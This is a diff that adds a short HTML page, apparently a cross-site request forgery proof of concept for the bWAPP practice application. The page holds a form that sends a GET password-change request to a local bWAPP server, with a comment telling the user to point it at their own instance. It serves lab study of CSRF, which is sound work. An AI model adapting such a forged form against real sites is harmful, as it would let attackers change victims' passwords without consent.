@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<div id="main">
+    <h1>CSRF (Change Password)</h1>
+
+    <p>Change your password.</p>
+    <!-- Change the action to your own bwapp server -->
+    <form action="http://192.168.1.9/bWAPP/csrf_1.php" method="GET">
+        <p><label for="password_new">New password:</label><br>
+        <input id="password_new" name="password_new" type="password"></p>
+
+        <p><label for="password_conf">Re-type new password:</label><br>
+        <input id="password_conf" name="password_conf" type="password"></p>  
+
+        <button type="submit" name="action" value="change">Change</button>   
+    </form>
+</div>
+</body></html>
